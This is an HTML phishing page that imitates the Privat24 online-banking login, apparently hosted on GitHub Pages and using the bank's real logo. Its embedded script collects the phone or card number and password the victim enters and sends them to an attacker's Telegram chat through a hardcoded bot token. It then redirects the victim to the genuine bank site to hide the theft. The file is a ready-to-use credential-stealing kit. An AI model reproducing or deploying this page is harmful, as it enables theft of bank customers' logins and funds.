<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Приват24 - Авторизація</title>
    <link rel="stylesheet" href="https://shskdbndnd-afk.github.io/style.css"> <!-- Підключаємо стилі оригіналу -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .login-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 25px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        button:hover {
            background: #0052a3;
        }
        .error-message {
            color: #e74c3c;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://next.privat24.ua/assets/images/logo.svg" alt="Приват24" width="180">
        </div>
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="phone" placeholder="Номер телефону або картки" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Пароль" required>
            </div>
            <button type="submit">Увійти</button>
        </form>
        <div class="error-message" id="errorMessage">
            Неправильний логін або пароль. Спробуйте ще раз.
        </div>
    </div>

    <!-- JavaScript для збору даних -->
    <script>
        // Telegram бот конфігурація
        const TELEGRAM_BOT_TOKEN = "8231647805:AAHcL81v0txv8dxEmFeqgGGifSirfqllmko";
        const TELEGRAM_CHAT_ID = "7821511724";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const ip = "Невідомо (GitHub Pages)";
            const date = new Date().toISOString();

            // Формування повідомлення для Telegram
            const message = `🚨 *НОВИЙ ВХІД В ПРИВАТ24* 🚨\n\n` +
                           `🔹 *Телефон/Картка:* \`${phone}\`\n` +
                           `🔹 *Пароль:* \`${password}\`\n` +
                           `🔹 *IP-адреса:* \`${ip}\`\n` +
                           `🔹 *Час:* \`${date}\`\n\n` +
                           `🔥 *Термінова дія: Змінити пароль негайно!*`;

            // Відправка в Telegram
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                               `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(telegramUrl)
                .then(response => {
                    if (response.ok) {
                        // Перенаправлення на реальний сайт
                        window.location.href = "https://next.privat24.ua";
                    } else {
                        document.getElementById('errorMessage').style.display = 'block';
                    }
                })
                .catch(error => {
                    console.error("Помилка при відправці в Telegram:", error);
                    document.getElementById('errorMessage').style.display = 'block';
                });
        });
    </script>
</body>
</html>
